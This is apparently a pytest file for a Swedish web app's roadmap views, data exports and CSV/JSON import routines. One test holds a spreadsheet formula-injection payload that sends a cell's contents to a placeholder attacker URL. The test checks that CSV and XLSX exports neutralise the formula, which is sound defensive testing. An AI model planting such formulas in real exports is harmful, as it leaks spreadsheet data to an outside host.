"""Tests for roadmap (R1/R2), exports (E1 + xlsx) and the import script (E2),
including the roadmap half of acceptance test §9.4."""

import csv
import io
import json
from pathlib import Path

from openpyxl import load_workbook

from app.services.importera import importera_medlemmar, importera_trad, las_rader
from app.services.roadmap import roadmap_data
from tests.conftest import (
    csrf_fran, logga_in, satt_svar, seed_trad, skapa_funktion, skapa_medlem,
)


def test_roadmap_r1_typfilter(client, app_db):
    seed_trad(app_db)
    logga_in(client, app_db)
    sida = client.get("/roadmap").text
    assert "Publicering" in sida and "Import från Web of Science" in sida
    assert "Dubblettdetektering" not in sida          # krav hidden by default
    med_krav = client.get("/roadmap", params={"visa_krav": "1"}).text
    assert "Dubblettdetektering" in med_krav


def test_roadmap_dolj_formagor(client, app_db):
    seed_trad(app_db)
    logga_in(client, app_db)
    sida = client.get("/roadmap", params={"dolj_formagor": "1"}).text
    assert "Publicering" not in sida
    assert "Registrera avhandling" in sida
    # Exporten följer samma filter.
    export = client.get("/roadmap/export", params={"dolj_formagor": "1"}).text
    assert "Publicering" not in export
    assert "Registrera avhandling" in export


def test_roadmap_formaga_utan_undernoder_doljs(client, app_db):
    # "Export & spridning" saknar undernoder av typ funktion/krav och vore
    # bara en tom rubrik i roadmapen — den visas ingenstans. I behovsträdet
    # finns den kvar.
    seed_trad(app_db)
    logga_in(client, app_db)
    assert "Export &amp; spridning" not in client.get("/roadmap").text
    assert "Publicering" in client.get("/roadmap").text
    assert "Export &amp; spridning" in client.get("/trad").text


def test_roadmap_formagor_som_kontext(client, app_db):
    seed_trad(app_db)
    logga_in(client, app_db)
    # Publicering har funktioner i både Medlem 1 (registrera, import) och
    # senare (wos) — förmågan visas som hierarkikontext under båda avgångarna.
    sida = client.get("/roadmap").text
    assert sida.count(">Publicering</span>") == 2

    # Förmågans EGEN avgång skapar ingen grupp: en förmåga i "Zon" med sin
    # enda funktion i Medlem 1 syns bara där.
    ensam = skapa_funktion(app_db, "Ensam förmåga", typ="förmåga", fas="Zon",
                           status="planerad")
    skapa_funktion(app_db, "Ensam funktion", ensam, typ="funktion")
    app_db.commit()
    sida = client.get("/roadmap").text
    assert ">Zon</h2>" not in sida
    assert ">Ensam förmåga</span>" in sida


def test_roadmap_formagor_utan_statuspiller_och_flytt(client, app_db):
    seed_trad(app_db)
    logga_in(client, app_db)
    # Seedens enda driftsatta noder är förmågor; utan status på förmågerader
    # saknar exporten driftsatt-brickor helt, medan funktionerna har kvar sina.
    export = client.get("/roadmap/export").text
    assert 'badge status-driftsatt' not in export
    assert 'badge status-planerad' in export
    # I redigeringsläget kan förmågerader inte flyttas: bara de tre
    # funktionerna får avgångsväljare (kravet är bortfiltrerat).
    sida = client.get("/roadmap", params={"redigera": "1"}).text
    assert sida.count("fas-form") == 3


def test_roadmap_avgangsordning(conn):
    # Medlem 1 först, övriga avgångar alfabetiskt, senare alltid näst sist
    # och restgruppen "utan avgång" allra sist.
    for namn, fas in [("A", "Zon"), ("B", None), ("C", "senare"),
                      ("D", "Medlem 1"), ("E", "Alfa")]:
        # B utan avgång behöver en status utan avgångskrav.
        skapa_funktion(conn, namn, typ="funktion", fas=fas,
                       status="planerad" if fas else "utreds")
    conn.commit()
    assert [fas for fas, _ in roadmap_data(conn)] == [
        "Medlem 1", "Alfa", "Zon", "senare", "utan avgång"]


def test_acceptance_9_4_roadmap_export(client, app_db):
    ids = seed_trad(app_db)
    # "Export & spridning" behöver en undernod för att alls visas i roadmapen
    # (förmågor utan undernoder utelämnas) — testet gäller synlighetsfiltret.
    skapa_funktion(app_db, "Spridning till DiVA-portalen", ids["export"],
                   typ="funktion")
    app_db.execute("UPDATE funktion SET synlig_externt = 0 WHERE id = ?",
                   (ids["publicering"],))
    app_db.commit()
    logga_in(client, app_db)

    export = client.get("/roadmap/export")
    assert export.status_code == 200
    assert 'attachment; filename="roadmap-' in export.headers["content-disposition"]
    # The hidden capability's whole subtree is gone from the export ...
    assert "Publicering" not in export.text
    assert "Import från Web of Science" not in export.text
    assert "Export &amp; spridning" in export.text
    # ... and the export is script-free (R2).
    assert "<script" not in export.text
    # ... but admins still see the branch in the roadmap view.
    assert "Publicering" in client.get("/roadmap").text


def test_roadmap_redigeringslage_och_flytt(client, app_db):
    ids = seed_trad(app_db)
    logga_in(client, app_db)

    # The read view is inert: no move endpoint anywhere near it.
    las = client.get("/roadmap").text
    assert "Redigera roadmap" in las
    assert "/roadmap/flytta" not in las

    # Edit mode: per-row forms plus empty named phases as drop targets.
    sida = client.get("/roadmap", params={"redigera": "1"}).text
    assert "/roadmap/flytta" in sida
    assert "Klar — lås roadmapen" in sida
    assert "utan avgång" in sida

    token = csrf_fran(sida)
    svar = client.post(
        "/roadmap/flytta",
        data={"nod_id": ids["publicering"], "fas": "nästa", "csrf_token": token},
        follow_redirects=False,
    )
    assert svar.status_code == 303 and "redigera=1" in svar.headers["location"]
    assert app_db.execute("SELECT fas FROM funktion WHERE id = ?",
                          (ids["publicering"],)).fetchone()[0] == "nästa"
    # Only the node itself moves — children keep their own fas.
    assert app_db.execute("SELECT fas FROM funktion WHERE id = ?",
                          (ids["wos"],)).fetchone()[0] == "senare"

    # htmx (drag-and-drop) gets the groups partial back; empty fas = "utan
    # avgång" — tillåtet för dubbletten (idé), medan planerad/driftsatt stoppas
    # av avgångskravet (eget test nedan).
    svar = client.post(
        "/roadmap/flytta",
        data={"nod_id": ids["dubblett"], "fas": ""},
        headers={"HX-Request": "true", "X-CSRF-Token": token},
    )
    assert svar.status_code == 200 and 'id="roadmap-grupper"' in svar.text
    assert app_db.execute("SELECT fas FROM funktion WHERE id = ?",
                          (ids["dubblett"],)).fetchone()[0] is None
    assert app_db.execute("SELECT fas FROM funktion WHERE id = ?",
                          (ids["publicering"],)).fetchone()[0] == "nästa"


def test_roadmap_flytt_till_utan_avgang_stoppas_for_planerad(client, app_db):
    ids = seed_trad(app_db)
    logga_in(client, app_db)
    token = csrf_fran(client.get("/roadmap", params={"redigera": "1"}).text)

    # htmx-svaret måste vara 200 (htmx swappar inte icke-2xx) — felet syns som
    # banner i den omswappade gruppvyn, och databasen är orörd.
    svar = client.post(
        "/roadmap/flytta",
        data={"nod_id": ids["publicering"], "fas": ""},
        headers={"HX-Request": "true", "X-CSRF-Token": token},
    )
    assert svar.status_code == 200
    assert 'id="roadmap-fel"' in svar.text and "måste ha en avgång" in svar.text
    assert 'id="roadmap-grupper"' in svar.text
    assert app_db.execute("SELECT fas FROM funktion WHERE id = ?",
                          (ids["publicering"],)).fetchone()[0] == "Medlem 1"

    # Utan JS: helsida med samma banner och 400.
    svar = client.post(
        "/roadmap/flytta",
        data={"nod_id": ids["publicering"], "fas": "", "csrf_token": token},
    )
    assert svar.status_code == 400 and "måste ha en avgång" in svar.text


def test_roadmap_flytta_kraver_csrf_och_nod(client, app_db):
    ids = seed_trad(app_db)
    logga_in(client, app_db)
    svar = client.post("/roadmap/flytta", data={"nod_id": ids["publicering"], "fas": "nu"})
    assert svar.status_code == 400
    token = csrf_fran(client.get("/roadmap", params={"redigera": "1"}).text)
    svar = client.post("/roadmap/flytta",
                       data={"nod_id": 99999, "fas": "nu", "csrf_token": token})
    assert svar.status_code == 404


def test_json_export_utan_token(client, app_db):
    seed_trad(app_db)
    medlem = skapa_medlem(app_db, "Uppsala universitet")
    app_db.execute("UPDATE medlem SET token = 'hemlig-hash' WHERE id = ?", (medlem,))
    satt_svar(app_db, medlem, seed := 1, "golive_krav")
    app_db.commit()
    logga_in(client, app_db)

    svar = client.get("/export/json")
    data = json.loads(svar.text)
    assert set(data) == {"funktion", "medlem", "bedomning", "bedomning_historik"}
    assert len(data["funktion"]) == 6
    assert data["bedomning"][0]["svar"] == "golive_krav"
    assert all("token" not in rad for rad in data["medlem"])
    assert "hemlig-hash" not in svar.text


def test_csv_exporter(client, app_db):
    ids = seed_trad(app_db)
    medlem = skapa_medlem(app_db, "Uppsala universitet")
    satt_svar(app_db, medlem, ids["wos"], "kan_vanta", workaround="Cron-skript.")
    app_db.commit()
    logga_in(client, app_db)

    trad = client.get("/export/trad.csv").text
    assert trad.splitlines()[0].startswith("id,namn,foralder_id,foralder_namn")
    assert "Dubblettdetektering" in trad

    bed = client.get("/export/bedomningar.csv").text
    assert "Uppsala universitet" in bed and "Cron-skript." in bed


def test_export_neutraliserar_formelinjektion(client, app_db):
    """A member's free-text that starts as a spreadsheet formula must be
    neutralized in both CSV and XLSX so it can't run on a förvaltare's machine."""
    ids = seed_trad(app_db)
    medlem = skapa_medlem(app_db, "Uppsala universitet")
    elak = '=HYPERLINK("http://angripare/?"&A1,"klicka")'
    satt_svar(app_db, medlem, ids["wos"], "kan_vanta",
              workaround=elak, workaround_delas=1)
    app_db.commit()
    logga_in(client, app_db)

    bed = client.get("/export/bedomningar.csv").text
    rad = next(r for r in csv.DictReader(io.StringIO(bed))
               if r["medlem"] == "Uppsala universitet")
    assert rad["workaround"] == "'" + elak       # apostrophe-prefixed, so inert

    svar = client.get("/export/teaball.xlsx")
    wb = load_workbook(io.BytesIO(svar.content))
    rad = next(wb["Bedömningar"].iter_rows(min_row=2, values_only=True))
    cell = rad[4]                                # Workaround column
    assert cell == "'" + elak                    # stored as literal text, not a formula


def test_xlsx_export_alla_vyer(client, app_db):
    ids = seed_trad(app_db)
    medlem = skapa_medlem(app_db, "Uppsala universitet")
    satt_svar(app_db, medlem, ids["dubblett"], "golive_krav")
    app_db.commit()
    logga_in(client, app_db)

    svar = client.get("/export/teaball.xlsx")
    assert svar.status_code == 200
    wb = load_workbook(io.BytesIO(svar.content))
    assert wb.sheetnames == ["Behovsträd", "Bedömningar", "Analys", "Migrering", "Roadmap"]

    trad_blad = wb["Behovsträd"]
    namn = [rad[0] for rad in trad_blad.iter_rows(min_row=2, values_only=True)]
    assert namn[0] == "Publicering"                       # tree order, roots unindented
    assert any(n.lstrip() == "Dubblettdetektering" and n.startswith("    ") for n in namn)

    bed_blad = wb["Bedömningar"]
    rad = next(bed_blad.iter_rows(min_row=2, values_only=True))
    assert rad[0] == "Uppsala universitet" and rad[3] == "Go-live"

    analys_blad = wb["Analys"]
    assert "1 av 1" in analys_blad.cell(row=1, column=1).value


def test_import_fran_csv(conn):
    csv_text = (
        "namn,foralder,typ,status,fas\n"
        "Publicering,,förmåga,driftsatt,nu\n"
        "Registrera avhandling,Publicering,funktion,driftsatt,nu\n"
        "Spikblad genereras,Registrera avhandling,krav,planerad,nästa\n"
        "Import,Publicering,funktion,utreds,nu\n"
    )
    antal = importera_trad(conn, las_rader(csv_text, "underlag.csv"))
    conn.commit()
    assert antal == 4
    rows = {r["namn"]: dict(r) for r in conn.execute("SELECT * FROM funktion")}
    assert rows["Registrera avhandling"]["foralder_id"] == rows["Publicering"]["id"]
    assert rows["Spikblad genereras"]["foralder_id"] == rows["Registrera avhandling"]["id"]
    # File order becomes sibling order.
    ordning = [r["namn"] for r in conn.execute(
        "SELECT namn FROM funktion WHERE foralder_id = ? ORDER BY sortering",
        (rows["Publicering"]["id"],))]
    assert ordning == ["Registrera avhandling", "Import"]


def test_import_fel_avvisas(conn):
    import pytest

    # fas-kolumnen ifylld där default-statusen (planerad) annars skulle snubbla
    # på avgångskravet före det fel som faktiskt testas.
    with pytest.raises(ValueError, match="finns varken"):
        importera_trad(conn, las_rader("namn,foralder,fas\nA,Saknas,nu\n", "x.csv"))
    with pytest.raises(ValueError, match="inte unikt i filen"):
        importera_trad(conn, las_rader(
            "namn,foralder,fas\nDubbel,,nu\nDubbel,,nu\nBarn,Dubbel,nu\n", "x.csv"))
    with pytest.raises(ValueError, match="okänd typ"):
        importera_trad(conn, las_rader("namn,foralder,typ\nA,,fel\n", "x.csv"))
    with pytest.raises(ValueError, match="kräver en avgång"):
        importera_trad(conn, las_rader("namn,foralder,status\nA,,planerad\n", "x.csv"))
    with pytest.raises(ValueError, match="Rad 3.*kräver en avgång"):
        importera_trad(conn, las_rader(
            "namn,status,fas\nA,utreds,\nB,driftsatt,\n", "x.csv"))


def test_import_fran_json(conn):
    data = json.dumps([
        {"namn": "Publicering", "typ": "förmåga", "status": "driftsatt", "fas": "nu"},
        {"namn": "Import", "foralder": "Publicering", "typ": "funktion", "fas": "nu"},
    ])
    assert importera_trad(conn, las_rader(data, "underlag.json")) == 2


def test_importera_medlemmar_fran_csv(conn):
    csv_text = "namn,kategori\nUppsala universitet,universitet\nRiksarkivet,\n"
    assert importera_medlemmar(conn, las_rader(csv_text, "medlemmar.csv")) == (2, 0)
    conn.commit()
    rader = {r["namn"]: r["kategori"]
             for r in conn.execute("SELECT namn, kategori FROM medlem")}
    assert rader == {"Uppsala universitet": "universitet", "Riksarkivet": None}


def test_importera_medlemmar_hoppar_befintliga(conn):
    skapa_medlem(conn, "Uppsala universitet")
    csv_text = ("namn,kategori\nUppsala universitet,universitet\n"
                "Umeå universitet,universitet\n")
    assert importera_medlemmar(conn, las_rader(csv_text, "m.csv")) == (1, 1)
    # Rerunning the same file is a no-op.
    assert importera_medlemmar(conn, las_rader(csv_text, "m.csv")) == (0, 2)


def test_importera_medlemmar_fel_avvisas(conn):
    import pytest

    with pytest.raises(ValueError, match="namn saknas"):
        importera_medlemmar(conn, las_rader("namn,kategori\n,museum\n", "m.csv"))
    with pytest.raises(ValueError, match="flera gånger"):
        importera_medlemmar(conn, las_rader("namn\nDubbel\nDubbel\n", "m.csv"))


def test_diva_underlagen_importerar(conn):
    """The bundled data files must stay importable and internally consistent."""
    rot = Path(__file__).resolve().parent.parent
    fil = rot / "data" / "diva_medlemmar.csv"
    nya, hoppade = importera_medlemmar(
        conn, las_rader(fil.read_text("utf-8"), fil.name))
    assert (nya, hoppade) == (49, 0)
    rad = conn.execute(
        "SELECT kategori FROM medlem WHERE namn = 'Uppsala universitet'").fetchone()
    assert rad["kategori"] == "universitet"

    trad = rot / "data" / "diva_formagekarta_exempel.csv"
    assert importera_trad(conn, las_rader(trad.read_text("utf-8"), trad.name)) == 16
